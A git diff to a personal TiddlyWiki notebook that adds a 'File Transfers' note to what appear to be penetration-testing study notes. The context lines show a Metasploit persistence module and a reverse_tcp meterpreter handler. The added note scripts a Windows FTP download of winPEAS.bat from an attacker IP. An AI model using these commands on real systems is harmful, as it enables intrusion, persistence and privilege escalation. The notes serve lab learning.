@@ -275,6 +275,8 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 
 <li>Exploitation</li>
 
+<li>File Transfers</li>
+
 <li>Finance</li>
 
 <li>Fitness</li>
@@ -9654,7 +9656,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211002160812969" list="CrappyMakerProgrammer Tech Operations/IT [[Cyber Security]]" modified="20211002164412207" title="$:/StoryList">
+<div created="20211002160812969" list="CrappyMakerProgrammer Tech Operations/IT [[Cyber Security]] [[File Transfers]]" modified="20211002174438941" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -10654,6 +10656,20 @@ msf (s4u_persistence) &gt; use exploit/multi/handler
 msf (handler) &gt; set payload windows/meterpreter/reverse_tcp
 msf (handler) &gt; exploit
 # once victim restarts and logons, we will get a meterpreter shell
+```</pre>
+</div>
+<div created="20211002174442005" modified="20211002174449254" title="File Transfers">
+<pre>! Windows
+
+```
+echo open 10.8.52.126 22121 &gt; ftp.txt
+echo USER anonymous &gt;&gt; ftp.txt
+echo password &gt;&gt; ftp.txt # password
+echo bin &gt;&gt; ftp.txt
+echo GET winPEAS.bat &gt;&gt; ftp.txt
+echo bye &gt;&gt; ftp.txt
+ftp -v -n -s:ftp.txt
+
 ```</pre>
 </div>
 <div created="20210810053719661" modified="20210810142342904" tags="TableOfContents" title="Finance">
